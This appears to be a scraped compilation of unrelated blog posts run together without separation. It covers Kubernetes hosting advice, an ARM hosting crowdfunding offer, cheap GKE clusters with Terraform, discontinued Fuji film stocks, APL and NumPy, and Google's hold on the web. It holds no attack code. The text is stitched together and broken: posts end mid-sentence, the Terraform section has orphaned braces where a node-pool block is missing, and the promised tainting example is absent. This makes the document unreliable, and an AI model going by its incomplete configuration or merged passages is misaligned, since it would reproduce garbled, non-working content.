<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>A question I often hear from teams - both new and established - is “should we host our stack on <a href="https://kubernetes.io/">Kubernetes</a>?”.  Given all the buzz it gets in the tech world a lot of people assume&nbsp;so.</p>
<p>I’ve been working with k8s for several years - often with very powerful and complex platforms - and I think the truth is more&nbsp;nuanced.</p>
<p>Here’s my attempt at untangling that decision.  It’s geared toward startups and self-sufficient teams in wider organisations with responsibility for hosting their own products.  It might also have value to people in more traditional <span>IT</span> departments at larger&nbsp;organisations.</p>
<h3>How Can it Help&nbsp;Me?</h3>
<p>Kubernetes isn’t just a 2018-era buzzword.  It’s a robust, highly scalable system that allows you to construct application deployments out of well-considered primitives (<code>Pod</code>, <code>Service</code>, <code>Ingress</code> etc) then does its damnedest to make the reality match.  When applications crash it restarts them.  When whole swathes of underlying machines disappear it tries to replace them.  If you’re running numerous services (probably developed as a microservice architecture) and you’re looking for efficiency, resilience and a good story for deployment it can do a lot for&nbsp;you.</p>
<p>Want a basic degree of resilience in your service? (yes you do) - run <a href="https://kubernetes.io/docs/concepts/workloads/controllers/replicaset/">multiple replicas</a> in your deployment then balance traffic between&nbsp;them.</p>
<p>If your workload is ‘bursty’ (e.g. a lot of <span>API</span> traffic) you could build on this by rigging up <a href="https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/">autoscaling</a> to grow capacity when it’s needed.  This can save you a lot of money - instead of paying for peak capacity all of the time, provision a baseload amount to keep the platform ticking over and bring up more replicas when they’re needed.  And if you can <a href="https://cloud.google.com/kubernetes-engine/docs/concepts/custom-and-external-metrics">import the queue length</a> into your system autoscaling works for queue-based workloads&nbsp;too.</p>
<p>Worried about your code breaking?  Configure liveness/readiness <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">probes</a> and Kubernetes will automatically restart your services when they fail.  Likewise for hardware failure - I’ve seen clusters who’ve lost half their nodes keep on trucking like nothing happened.  A well-configured and maintained Kubernetes cluster can be incredibly robust.  If you have the resources you might even try running a <a href="https://netflix.github.io/chaosmonkey/">chaos-monkey</a>-like <a href="https://www.gremlin.com/chaos-monkey/chaos-monkey-alternatives/kubernetes/">tool</a> to make certain your stack will tolerate regular&nbsp;failures.</p>
<p>Kubernetes has excellent features for integrating with your <span>CI</span> workflow.  The most common pattern I see for this is a build (ideally standardised across all your projects) that pushes an image to a Docker registry then kicks your k8s cluster to load it.  Depending on taste that can be done by modifying the deployment to pull a new tag, or pointing the tag to the new image and triggering k8s to reload all pods.  In most cases (migrations ruin everything) deployment can be fully automated: if you trust your tests and feature flags it can be 100% automatic (aka <a href="https://www.continuousdelivery.com/">Continuous Delivery</a>); for the less brave a manual approval step after the build eases the pain.  Either way your developers should be able to release most builds to the cluster without any help from Kubernetes&nbsp;specialists.</p>
<p>In a similar vein to <span>CI</span> it can help you standardise logging and monitoring for your applications.  Doing this is by no means unique to Kubernetes, but having a single cluster-wide system that gathers together data about all your services in the same place can greatly ease the pain of debugging.  I’ve seen particularly good results come from using <a href="https://github.com/fluent/fluentd-kubernetes-daemonset">fluentd</a> to pipe json-structured logging output from applications into <a href="https://aws.amazon.com/cloudwatch/"><span>AWS</span> CloudWatch</a> and query it through <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/AnalyzingLogData.html">Insights</a>.</p>
<p>Finally it can do a great deal to increase efficiency - both at the hosting layer (i.e. jamming as many applications onto those expensive <span>EC2</span> instances as possible) and also reducing the time your developers need to spend deploying software.  Humans cost more than computers so for most organisations the second of these will be the biggest win.  But Kubernetes isn’t magic - I’ve seen some beautiful, efficient clusters and some total gas guzzlers.  <em>You’ll only save money with Kubernetes if you invest in using it&nbsp;correctly.</em></p>
<h3>Where Does Kubernetes&nbsp;Shine?</h3>
<p>First of all think about your workload.  What kind of applications do you need to run?  How do they talk to each other and the outside world?  From experience I’d say the following attributes make your stack a good&nbsp;fit:</p>
<ul>
<li>Broadly speaking have you followed a microservice architecture?  There’s little value in Kubernetes if your world only has one application.  You’ll need to <a href="https://docs.docker.com/engine/examples/">Dockerize</a> your applications to deploy them to k8s; doing this from day 1 of any project is a good way to make yourself think about the boundaries between&nbsp;services.</li>
<li>Are your services exposed to each other and the outside world via <span>HTTP</span>(s) (probably yes, it’s 2020)?  This will fit k8s’ model nicely and you can use one of the normal <a href="https://github.com/kubernetes/ingress-nginx">ingress controllers</a> to front&nbsp;them.</li>
<li>Are your applications suitable to be load balanced?  No local state (use PostgreSQL / Redis / whatever for that), communication over known endpoints, fast startup/shutdown.  That isn’t to say you can’t keep shortlived state like a Redis cache in your cluster but for many cases you’d do better to use the boxed services a cloud provider&nbsp;offers.</li>
<li>Kubernetes is also well suited to headless applications like batch processing (through its <code>Job</code> <a href="https://kubernetes.io/docs/concepts/workloads/controllers/job/">controller</a>) and long-lived&nbsp;queue-consumers.</li>
<li>Is memory (and to a lesser extent <span>CPU</span>) usage predictable?  Kubernetes will try to host your applications on the same physical machines, so if one of them goes haywire and consumes all the <span>RAM</span> other workloads may be randomly killed.  In my experience this is the single biggest source of instability on Kubernetes clusters.  If you understand the resource usage of your applications you can declare a <code>resources.requests</code> and <code>resources.limits</code> to guarantee they’ll always get the memory they need and won’t be bad&nbsp;neighbours.</li>
</ul>
<p>Conversely here are a few kinds of workload I <em>don’t</em> think you should use it&nbsp;for:</p>
<ul>
<li>Static websites.  Typically you’d do this by baking your content into an <a href="https://hub.docker.com/_/nginx/">Nginx</a>-derived image and exposing it via your cluster’s ingress controller.  That’s a terrible way to host static content: all those little copies of Nginx need to be maintained, it’s inefficient and far less resilient / performant than it could be at the network level.  Sure you could stick it behind a <span>CDN</span> but if you’re doing that, why not have a cloud service host the content as&nbsp;well?</li>
<li>Hosting untrusted code.  That could mean applications supplied by your customers or third party code with a history of security problems, e.g. Wordpress or a dodgy library from <span>NPM</span>.  By default Kubernetes’ features for isolating workloads aren’t great.  You can add things like <a href="https://www.projectcalico.org/">Calico</a> to control network access but it’s easy to screw up and your security model is always going to be 100% dependent on the container runtime.  The default for this (Docker, based on <a href="https://en.wikipedia.org/wiki/Cgroups">Linux cgroups</a>) offers a huge attack surface to compromised applications: if a codebase your cluster is running gets hacked an attacker will not find it hard to escalate their access to the rest of the cluster.  Interesting work is being doing on alternatives to cgroups (e.g. <a href="https://katacontainers.io/">Kata Containers</a>) but it’s not yet mainstream enough to recommend to the average&nbsp;user.</li>
</ul>
<p>If your workload isn’t a good fit you may still have options for shoehorning it into Kubernetes (e.g. <a href="https://kubernetes.io/docs/concepts/storage/volumes/">volumes</a> can be used for long-lived state), but expect to spend a lot of engineering time working around the problems.  A lot of them are bad practices anyhow so your resources time might be better spent designing them out of the stack altogether - they’re only going to hurt you further down the&nbsp;line.</p>
<h3>No Magic&nbsp;Bullet</h3>
<p>Kubernetes isn’t a magic bullet.  It can help to move the complexities of hosting applications into a well-designed layer of their own but it won’t make them go away.  You’re always going to have to secure and maintain your&nbsp;platform.</p>
<p>To make a cluster useful for the average workload a menagerie of add-ons will be required.  Some of them almost everyone uses, others are somewhat niche.  Examples include (the Nginx <a href="https://github.com/kubernetes/ingress-nginx">ingress controller</a>, <a href="https://github.com/jetstack/cert-manager">cert-manager</a> and <a href="https://github.com/kubernetes/autoscaler/tree/master/cluster-autoscaler">cluster-autoscaler</a> to add extra nodes when you don’t have enough capacity.  Having a bespoke set of software operating key features of the environment makes your cluster a unique snowflake and it needs to be managed as such.  Also they need to be updated regularly and can sometimes be of questionable quality.  Configuration management tools like <a href="https://helm.sh/">Helm</a> or <a href="https://registry.terraform.io/providers/hashicorp/kubernetes/latest/docs">Terraform</a> are nigh-on mandatory: tinker with a cluster by hand at your peril, absent a declarative setup you’ll never be able to spin up another in exactly the same way.  I’ve seen this lead to no end of problems when operating or replacing more mature&nbsp;clusters.</p>
<p>When running any nontrivial stack on Kubernetes a degree of curation is always going to be required.  Letting anybody deploy whatever they like, however they like to your cluster can only lead to chaos.  You’ll end up with mess of inconsistently named applications scattered across dozens (or worse, one) namespaces with nobody knowing how they fit together.  Congratulations: you took your old spaghetti infrastructure and replaced it with a new flavour of spaghetti infrastructure, just served on a cooler kind of&nbsp;plate.</p>
<p>The most successful Kubernetes implementations I’ve seen are those where infrastructure specialist(s) work with developers to make sure workloads are well-configured, standardised, protected from one another and have defined patterns of communication.  They’ll handle the initial setup of an application on an infrastructure, hopefully wired up to a build/release system so dev teams can ship new versions of the code without help.  In a lot of ways this mirrors the wider culture of your organisation - if engineering is a chaotic free-for-all of bad communication and ill-defined responsibilities your hosting environment will mirror it.  At best this leads to unreliability; at worst an unreliable, unmaintainable, expensive&nbsp;mess.</p>
<h3>Cost of&nbsp;Ownership</h3>
<p>If you’re running applications on a large scale …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
          <section>
            <p>On our journey to true zero carbon hosting we want to explore if the world is ready for the next step: low power computing resources based on ARM.</p>

<p>For this reason we started this crowdfunding campaign that lasts 30 days and you can make an impact by choosing ARM or Intel for running your workload.</p>

<p>If only 50 people decide to go for ARM, we will build a new ARM hosting in our Zero Carbon Data Center here in Switzerland.</p>

<h2>Dedicated ARM computing</h2>

<p>We would like to take the next step and introduce <em>dedicated ARM compute resources</em>. Initially the offer will be for a Quad (4) core systems featuring 2 GB of RAM and 16GB of storage (microSD, class 10). These systems are using very little power and could shape the way how hosting is offered.</p>

<p>Using ARM, you will get a real, physical hardware instead of virtualised resources. The CPU will be based on the Allwinner A64 SoC running at 400 Mhz.</p>

<p>The choice of operating systems will be adjusted to ARM. Planned are Armbian, Arch Linux, Alpine Linux and NetBSD. More are likely to follow.</p>

<h2>The classic Intel/x86 way</h2>

<p>This crowdfunding also works as a vote. 
Do you prefer staying on x86_64, Intels 64 bit technology or do you want to switch to ARM?
While x86 is proven and virtualisation also helps to be energy efficient, the general design of x86 CPUs is more performance orientated and thus by design requiring more energy.</p>

<p>The choice of operating systems for the x86 VMs is the same ones as listed on <a href="https://datacenterlight.ch/">DataCenterLight.ch</a>.</p>

<h2>The offer</h2>

<p>If you can choose freely, what would you buy? We would love to know! We have created the following 4 offers:</p>

<ul>
<li>Dedicated IPv6 Only ARM, 4 Cores, 2 GB RAM, 16 GB microsd storage for 159.5 CHF/year</li>
<li>Dedicated IPv6 ARM with dedicated NAT64 mapped IPv4 address, 4 Cores, 2 GB RAM, 16 GB microsd storage for 258.5 CHF/year</li>
<li>IPv6 only x86 VM, 4 Cores, 2 GB RAM, 10 GB CEPH SSD for 170.5 CHF/year</li>
<li>Dual Stack x86 VM, 4 Cores, 2 GB RAM, 10 GB CEPH SSD for 269.5 CHF/year</li>
</ul>

<p>(all prices excluding VAT where applicable)</p>

<h2>Conditions</h2>

<p>If at least 50 people commit to ARM resources, we will setup dedicated ARM hosting in 2020. 
The one who participate in this crowdfunding campaign will be the first to get their hands on ARM resources.
ARM resources </p>

<p>If less than 50 people commit on ARM, all dedicated ARM servers will be refunded and no ARM infrastructure will be established in the Data Center Light.</p>

<p>The x86 based resources will be setup independently of whether or not the goal of ARM servers is reached. You can see real time on this crowdfunding page who is in favor for which technology.</p>

<h2>Get in touch with us</h2>

<p>If you have any questions or would like to discuss the ARM offer, we welcome you in our <a href="https://chat.with.ungleich.ch/">Open Chat</a>. You can also reach us by mail at support -at- ungleich.ch.
You can also checkout the <a href="https://ungleich.ch/">ungleich homepage</a> and the <a href="https://datacenterlight.ch/">Data Center Light hosting</a>.</p>

      <p>Kubernetes is complex and tasks time to master, therefore some practical usage helps to understand Kubernetes. Running Kubernetes locally using <a href="https://github.com/kubernetes-sigs/kind">Kind</a> is easy to setup and experiment with, it even supports multi node clusters. However, with many pods and nodes, CPU and memory on your computer becomes a constraint. Also, many companies use a managed Kubernetes solution, so you want to have some experience with a managed solution. Managed Kubernetes is expensive for personal usage, the baseline cost for an EKS cluster is $72 per month and regional AKS and GKE clusters have similar pricing. On top of that you have node costs for running your workloads.</p>
<h2>Lowering costs</h2>
<p>There are two ways to lower the <strong>primary</strong> managed Kubernetes cluster costs:</p>
<ul>
<li>A free cluster(no monthly cost for the control plane).</li>
<li>Spot instances/Preemptible VMs - instances that can be terminated at any time within 2 minutes.</li>
</ul>
<p>AWS does not offer a free cluster in any way, you have a $72 monthly cost from the get go. On top of that their managed node groups do not offer spot instances currently, you'd have to use custom node groups to use spot instances which can be achieved with <code>eksctl</code> or EKS Terraform modules. Regarding AKS, I've never used AKS or Azure Cloud in any form so I'll not explore that option.</p>
<p>Google Cloud offers a free <strong>zonal</strong> cluster per account. A zonal cluster has a Kubernetes control plane only available in a single zone which means that if there is an outage in that zone you won't be able to configure your workloads since the control plane is unavailable. However, GKE still has an <a href="https://cloud.google.com/kubernetes-engine/sla">SLA with a guaranteed availability of 99.5% uptime for a zonal cluster</a> and you'd most likely not be heavily affected by downtime since you use the cluster for personal learning and experimentation.</p>
<p>You can create a managed node pool with preemptible VMs out of the box for your GKE cluster and there is a Terraform resource which supports creating node pools with preemptible VMs. Google Cloud's preemptible VMs have no guaranteed uptime and are removed after 24h, this means that you will usually have a couple of minutes of downtime(can be higher) daily for all workloads scheduled on Preemptible VMs. However, these instances are up to 80% cheaper!</p>
<h2>Creating a Zonal Cluster with a Preemptible Node Group using Terraform</h2>
<p>To create a zonal cluster you <strong>need</strong> to specify only a single zone as the cluster location, but the nodes can be located in multiple zones.</p>
<div><pre><span></span><span>resource</span> <span>"google_container_cluster" "default"</span> <span>{</span>
<span>  name</span>               <span>=</span> <span>"my-cluster"</span>
<span>  location</span>           <span>=</span> <span>"europe-west1-b"</span><span> # MUST BE A SINGLE ZONE, OTHERWISE IT COUNTS AS A REGIONAL CLUSTER</span>
<span>  min_master_version</span> <span>=</span> <span>"version"</span>

<span>  node_locations</span> <span>=</span> <span>[</span><span>"europe-west1-c"</span><span>]</span><span> # CAN BE MULTI ZONE</span>

<span>  # We can't create a cluster with no node pool defined, but we want to only use</span>
<span>  # separately managed node pools. So we create the smallest possible default</span>
<span>  # node pool and immediately delete it.</span>
<span>  remove_default_node_pool</span> <span>=</span> <span>true</span>
<span>  initial_node_count</span>       <span>=</span> <span>1</span>
<span>}</span>
</pre></div>


<p>We will reference the above cluster when creating a node pool. The node pool will consist of memory-optimized <code>n2d-standard-4</code> instances and they will have preemptible set to true. The <code>n2d-standard-4</code> instances cost <a href="https://cloud.google.com/compute/vm-instance-pricing#n2d_machine_types"><code>$153.01</code> monthly but running them in a preemptible node group brings down the costs to <code>$46.28</code></a>. These instances have 4 vCPUs and 32GB of memory making it possible to run many various workflows, you can deploy <code>prometheus-operator</code>, <code>elasticsearch</code> and anything else you'd like to learn! You can scale down and run smaller instance types as the standard <code>n2-standard-2</code> machine type that has 2 vCPUs and 8GB of memory which is priced at <code>$17.16</code> monthly when running in a preemptible node pool(<code>$56.71</code> monthly when not running in a preemptible node pool).
There are even smaller instances as the shared-core f1-micro(monthly <code>$4.53</code> - default / <code>$1.36</code> - preemptible) and g1-small(monthly <code>$11.76</code> - default / <code>$3.54</code> - preemptible) instance types, but they have low computing power. There are some additional costs for networking and storage but they should be minimal compared to instance and control plane costs for a small cluster.</p>

  <span>}</span>
<span>}</span>
</pre></div>


<h3>Tainting nodes</h3>
<p>If you prefer higher uptime for some applications and want to avoid scheduling some pods to the preemptible node pool you can taint the node pool. Tainting means that pods don't get scheduled to a particular node pool unless they <strong>tolerate</strong> the set taints. The below example sets taints using the key <code>role</code> with the value <code>ops</code> with the effect <code>NO_SCHEDULE</code>, meaning that a pod needs to tolerate these taints to be scheduled onto the nodes in that node pool.</p>

<p>Now you can create cheap preemptible node pools that are dedicated to specific workflows. For example you might want to learn how to create a Elasticsearch cluster with multiple replicas, then you might want a preemptible node pool for the cluster since it requires a lot of computing power. Or you can create and use only preemptible node pools for your whole cluster. Combine that with GKE's free zonal cluster and you can bring down costs to ~$20 monthly with a decently sized instance type <code>n2-standard-2</code>. <a href="https://cloud.google.com/products/calculator/#id=b3d304a4-11f9-4965-a325-b18f6294aa2a">Here's a link to the pricing calculation using GCP's calculator</a>.

			<p>My fridge was recently full of instant film. I mean that literally, it was not possible for me to put any more packets of the film into the fridge without risking damaging them:</p>

<p><img width="625px" src="https://leejo.github.io/images/2020/fuji/fridge.jpg"></p>

<p>I had acquired all of the film one day when my printer sent me an email asking if I wanted to purchase 93 packs of Fujifilm FP-100c for 2,790.- CHF. That’s 30.- CHF per box, about three times what this film used to retail for and about one third of what it currently sells for<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. So I thought about the offer for five minutes, then said yes.</p>

<p>I figured I could sell half of the packs and recoup my costs, after various expenses, then I would have around 45 boxes that I could shoot a photo project with. So I picked the film up and thanked my printer. He even included the above fridge, three Polaroid cameras, and a bunch of accessories for free. So whichever way I spin this, even if a few packs went missing in the post, I would still be close to doubling my investment <em>at the least</em> if I decided to sell all the film. Not bad.</p>

<p>The film had been discontinued, at least announced to be, in early 2016. The film was still available on a wholesale level up until sometime in 2018 so people had started stockpiling it and the prices inevitably went up. The problem with photographic film is that it will start go off in a few years as the chemicals break down, so it needs to be cold stored. This is especially the case with instant film as there are chemicals not just to record the image but also the entire development process is included in each frame.</p>

<p><strong>Instant Film</strong></p>

<p>There’s a market for this stuff as there is a range of old cameras and backs for other cameras that can only function with it. The film comes in dedicated plastic packs that the cameras/backs are designed to work with. You load a pack, fiddle about a bit, and you are ready to shoot. Like other instant films you take the shot, pull out the frame, give it a minute or two, then “peel apart” the frame to reveal the image.</p>

<p>The film can still be bought “new” on auction sites, some analog specific photography stores, and private sellers; but all of the film is now expired as the last batch was marked to do so in early 2019, so there’s a risk involved in any purchase of this film if you want it “fresh”. To purchase a single box of the film from one of the last batches you should expect to pay around 100.- CHF. Ten times what it originally retailed for.</p>

<p>Given there are ten frames in each box, and due to the fickle nature of the cameras that shoot this type of film you can often lose one or even two frames due to mechanical or exposure issues, you’re paying in the region of 12.- CHF <em>per photo</em>.</p>

<p>This is not a case of having to learn how to load and use the film - sometimes you just have bad luck. The paper mechanism used to pull out the shot frame and prepare the next sometimes tears. Just last week I was using some and the first frame leader from the box tore, I had to open the camera to retrieve the next leader and lost another three frames in the process. Somehow the third frame managed to hide amongst the rest and turned up again between the 6th and the 7th frame, something I’ve not experienced before.</p>

<p>This is not fun, it’s quite ridiculous, and if I’m being honest I don’t see the point of this stuff and find it all very annoying. I say that as someone who is steeped in the film process. Sure I understand the aesthetic and the tangible nature of the process, but that’s not for me. I mean, if you really want to shoot it that’s fine, but at this price point I would now prefer to <a href="https://leejo.github.io/projects/bergbahnen/polaroids/">emulate it</a>, at least when the reason to do so is to have some sort of contextual point for the aesthetic. Each to their own of course.</p>

<p><img width="625px" src="https://leejo.github.io/images/2020/fuji/freezer.jpg"></p>

<p>Anyway, Fuji have got form with this. I’ve been using some of their film stocks for close to two decades so have seen product lines come and go, and my other fridge/freezer (above) contains some of those products that I do continue to use. Of course you can still purchase some of the discontinued film if you really want to. A few of those I use or used to are detailed below, and this is in no way an <a href="https://en.wikipedia.org/wiki/List_of_discontinued_photographic_films#Fujifilm">exhaustive list</a>:</p>

<p><strong>Neopan 1600</strong> - A mid to high speed black and white film that had a grain structure that I haven’t seen in other films. I used this quite a bit when shooting skate photos but it was never available in formats larger than 35mm so I stopped when I moved exclusively to medium format. You see this now and then for sale, but it won’t be good to shoot as it’s <em>at least</em> a decade expired and mid-high speed film doesn’t last more than a few years after expiry unless it’s frozen; and of course you can’t guarantee the storage history.</p>

<p>I have seen this selling for 30 to 50.- CHF for a <em>single</em> roll of 35mm, or 250.- CHF for ten packs. That’s five to ten times its original retail price.</p>

<p><strong>Fuji Fortia</strong> - a once/twice off colour slide film that was released around 2005. It was like Fuji’s Velvia 50 (detailed below) but with even more saturated reds. There were rumours that it was a batch of Velvia that didn’t pass quality control, so Fuji sold it as a special edition for the cherry blossom season in Japan. It was available for a couple of years so probably just a single run, which does backup the “it was a messed up Velvia batch” rumor.</p>

<p>You see rolls of this for sale now and then, with the price approaching ten times what it originally retailed for. This was available in medium format so I did shoot it and you can see what I mean about the saturation from the image below, which I actually had to <em>desaturate</em> a little in post as it was just too much.</p>

<p><img width="625px" src="https://leejo.github.io/images/2020/fuji/2008_poppies_cambs.jpg"></p>

<p><strong>Acros 100</strong> - Another Fuji speciality, a medium to slow speed black and white film that offered four selling points: extremely fine grain for its box speed (100 ISO), very contrasty in normal development, very sharp, and very good reciprocity failure rates. You can shoot exposures up to several minutes long with little adjustment required, which may well be unique amongst all film stocks.</p>

<p>This was discontinued a couple of years ago but then came back as Acros II, however it is no longer Fuji manufacturing it and I believe it is a co-operation with Ilford<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>. This is probably a good thing, however the 4x5 version of the film is not being made and luckily I stocked up on this a few months before its original discontinuation was announced so I have enough to last me for a few years at least. I am using this film for a specific project, which is why I bought a few boxes; my current count is 12 remaining, that’s 240 frames.</p>

<p>I rarely see this for sale in its 4x5 version, and those I do see tend to not be from the final batches, which had expiry dates of 2019-10. This was selling for about 70.- CHF a box when it was available and I suspect those final batch boxes would go for at least twice that now.</p>

<p><strong>Velvia 50</strong> - The classic landscape (and Formula 1?<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>) photographer’s slide film. Very popular up until around, I dunno, 2005? It’s still going, but i suspect will be discontinued soon. It’s no longer available outside Japan in large format sizes, and Fuji have cut down on the number of options for it in smaller sizes. Also of note is that when I was stockpiling it the boxes had very short expiry dates, less than a year, suggesting that sales have slumped. Since then the price in Japan has gone up 50% so it’s no longer a compelling option.</p>

<p>I still shoot this, but it’s very fickle. It needs graduated neutral density filters in many cases (which I don’t have) and suffers from terrible reciprocity failure and very easy over/under exposure even if you know what you’re doing. You often have to bracket your exposures +/- a stop, which is not cheap when shooting large format film. When you get it right you understand why it was number one it its niche, again another shot that I had to pull back the saturation:</p>

<p><img width="625px" src="https://leejo.github.io/images/2020/fuji/lac_leman_2019.jpg"></p>

<p><strong>What Does This All Mean</strong></p>

<p>Discontinued film stocks are selling for twice to ten times their original retail price, so should you invest in film? Nah, not at all. Unless you discover a batch of Fuji FP-100c that’s been cold stored, is from 2018 or 2019, and selling at less than 40.- CHF a box, in which case go for it and double your investment. Clearly there is a market for discontinued photographic film emulsions, but they’re a niche within a niche and we’re now down to the products that don’t offer a unique selling point.</p>

<p>The discontinuation of the above stocks doesn’t mean much, really - you can just switch to another stock and adjust as necessary. Yeah it’s frustrating at first, but that’s the nature of film. The issue with Fuji FP-100c being discontinued is that it also renders an entire range (and more) of cameras unusable<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>. There are no other options, or at least limited options, to continue using the cameras<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>.</p>

<p>That’s what’s kind of sad about this entire thing, although I guess that is the end state of all technology designed around using refills to function. Printers, things with fixed internal batteries, liquid fuel vehicles, SodaStreams? There’s more of these than you think. We will still have 35mm film for a long time I suspect, and 120 and 4x5 and 8x10 and so on; but some of the more niche products are approaching obsolescence and thus unavailability. We can retrofit some of the technology that require these refills, but eventually the expense isn’t worth it.</p>

<p>My reasons for shooting film are because it gives me access to alternative formats and some technical controls that I can’t get elsewhere, at least not at an affordable price point<sup id="fnref:6" role="doc-noteref"><a href="#fn:6">6</a></sup>. Movements, a square or panoramic frame, an alternative way to interact with my subjects. An interesting observation about instant film is the reaction to it, compared to shooting a digital image that is effectively the same. The tangible nature of the process really is a hook.</p>

<p><em><strong>An Iverson ghost is an embedding of APL like array programming features in nonAPL languages and tools.</strong></em></p>
<p>You would be surprised at how often Iverson ghosts appear. Whenever programmers are challenged with processing large numeric arrays they rediscover bits of APL. Often they’re unaware of the rich heritage of array processing languages but in <code>NumPy's</code>&nbsp;case, they <em>indirectly</em> acknowledged the debt. In <a href="http://numpy.sourceforge.net/numdoc/numdoc.pdf"><em>Numerical Python</em></a> the authors wrote:</p>
<p><em>“The languages which were used to guide the development of NumPy include the infamous APL family of languages, Basis, MATLAB, FORTRAN, S and S+, and others.”</em></p>
<p>I consider “infamous” an upgrade from <a href="http://www.cs.virginia.edu/~evans/cs655/readings/ewd498.html">“a mistake carried through to perfection.”</a></p>
<p>Not only do developers frequently conjure up Iverson ghosts. They also invariably turn into little apostles of array programming that won’t shut up about how cutting down on all those goddamn loops clarifies and simplifies algorithms. How learning to think about operating on entire arrays, versus one dinky number at a time, frees the mind. Why it’s almost as if array programming <a href="http://www.jsoftware.com/papers/tot.htm">is a tool of thought.</a></p>
<p>Where have I heard this before?</p>
<p>Ahh, I’ve got it, when I first encountered APL almost fifty years ago.</p>
<p>Yes, I am an old programmer, a fossil, a living relic. My brain is a putrid pool of punky programming languages. Python is just the latest in a longish line of languages. Some people collect stamps. I collect programming languages. And, just like stamp collectors have favorite stamps, I find some programming languages more attractive than others. For example, I recognize the undeniable utility of <code>C/C++</code>, for many tasks they are the only serious options, yet as useful and pervasive as <code>C/C++</code> are they have never tickled my fancy. The notation is ugly! Yeah, I said it; suck on it C people. Similarly, the world’s most commonly used programming language <code>JavaScript</code> is equally ugly. Again, <code>JavaScript</code> is so damn useful that programmers put up with its many warts. Some have even made a few bucks writing books about its <a href="http://shop.oreilly.com/product/9780596517748.do">meager good parts</a>.</p>
<p>I have similar inflammatory opinions about other widely used languages. The one that is making me miserable now is <code>SQL</code>, particularly Microsoft’s variant&nbsp;<code>T-SQL</code>. On purely aesthetic grounds I find well-formed <code>SQL</code> queries less appalling than your average <code>C</code> pointer fest. Core <code>SQL</code> is fairly elegant but the macro programming features that have grown up around it are depraved. I feel dirty when&nbsp;forced to use them which is just about every other day.</p>
<p>At the end of my programming day, I want to look on something that is beautiful. I don’t particularly care about how useful a chunk of code is or how much money it might make, or what silly little business problem it solves. If the damn code is ugly I don’t want to see it.</p>
<p>People keep rediscovering array programming, best described in Ken Iverson’s 1962 book <a href="http://www.jsoftware.com/papers/APL.htm"><em>A Programming Language</em></a>, for two basic reasons:</p>
<ol>
<li>It’s an efficient way to handle an important class of problems.</li>
<li>It’s a step away from the ugly and back towards the beautiful.</li>
</ol>
<p>Both of these reasons manifest in <code>NumPy</code>‘s resounding success in the Python world.</p>
<p>As usual, efficiency led the way. The authors of <em>Numerical Python</em> note:</p>
<blockquote><p>Why are these extensions needed? The core reason is a very prosaic one, and that is that manipulating a set of a million numbers in Python with the standard data structures such as lists, tuples or classes is much too slow and uses too much space.</p></blockquote>
<p>Faced with a <a href="https://www.youtube.com/watch?v=ZBAijg5Betw">“does not compute”</a> situation you can either try something else or fix what you have. The Python people fixed Python with <code>NumPy</code>. <a href="https://www.quora.com/Whats-the-exact-difference-between-a-Pythoneer-and-a-Pythonista">Pythonistas</a> reluctantly embraced <code>NumPy</code> but quickly went <em>apostolic!</em> Now books like <a href="http://shop.oreilly.com/product/0636920038481.do"><em>Elegant SciPy</em></a> and the entire <code>SciPy</code> toolset that been built on <code>NumPy</code> take it for granted.</p>
<p>Is there anything in <code>NumPy</code> for programmers that have been drinking the array processing Kool-Aid for decades? The answer is yes! <a href="http://code.jsoftware.com/wiki/NuVoc">J programmers</a>, in particular, are in for a treat with the new Python3 addon that’s been released with the latest J 8.07 beta. This addon directly supports <code>NumPy</code> arrays making it easy to swap data in and out of the J/Python environments. It’s one of those best of both worlds things.</p>
<p>The following <code>NumPy</code> examples are from the <code>SciPy.org</code> <a href="https://docs.scipy.org/doc/numpy-dev/user/quickstart.html">NumPy quick start tutorial</a>. For each <code>NumPy</code> statement, I have provided a J equivalent. J is a descendant of APL. It was largely designed by the same man: Ken Iverson. A scumbag lawyer or greedy patent troll might consider suing <code>NumPy</code>‘s creators after looking at these examples. APL’s influence is obvious. Fortunately, Ken Iverson was more interested in promoting good ideas that profiting from them. I suspect he would be flattered that APL has mutated and colonized strange new worlds and I think even zealous Pythonistas will agree that Python is a delightfully strange world.</p>

	<p>Looking at Mozilla’s finances, it’s reasonable to conclude that Google is keeping them on life support to keep the anti-trust hounds at bay. Mozilla’s deal with Google will account for at least 70% of their revenues going forward. That’s over $400 million to be the default search provider in 4% of browsers. For 1 year. I’ll bet my next paycheck that Google reupped this rather generous agreement to avoid a repeat of Microsoft’s troubles over an Internet Explorer monopoly. My guess is that Google will decide it’s in their interest to pull the plug right around the time this latest wave of anti-trust talk blows over.</p>

<p>With the troubles at Mozilla, Google is one step closer to replicating the WeChat and Facebook walled-garden model on the Web. A quick survey a the field of play shows just how far Google has come in capturing the once open Web.</p>

<h2 id="browser-war-is-over">(Browser) War is over</h2>

<p>Chrome’s ability to dictate web standards will only get stronger over time. Safari and Firefox have been able to apply some shame to Chrome on things like disabling third-party cookies, but soon it’ll just be Apple left with a voice.</p>

<p>But Google doesn’t even need Chrome to dictate standards since it controls the Web’s front door. AMP, a technology no one asked for, is now on over 70% of all marketing websites for no other reason than Google said so.</p>

<p>And let’s not forget that most people now access the web via mobile devices, 75% of which run Google’s Android.</p>

<h2 id="original-sins">Original Sins</h2>

<p>Two deficiencies have determined the course the Web has taken: lack of native search and lack of native payments.</p>

<p>Lacking native distributed search allowed Google to grab a monopoly position as the entry point to the web. The Web’s orignal architects were off base on hyperlinks; it turns out people just want to skip right to the answer they’re looking for. There was once the beginnings of an alternative in public bookmarking sites, but social networks came and sucked all the air out of that space.</p>

<p>Lack of a safe and easy way of exchanging funds was a big factor in advertising becoming the dominant business model on the Web. No-charge services became the norm because, for a long time, there was no reasonable way to pay for them. Enter advertising to fill the void. I think it’s safe to say that Google’s AdWords is the dominant advertising platform on the open Web, which means it holds a commanding position in the Web’s finances.</p>

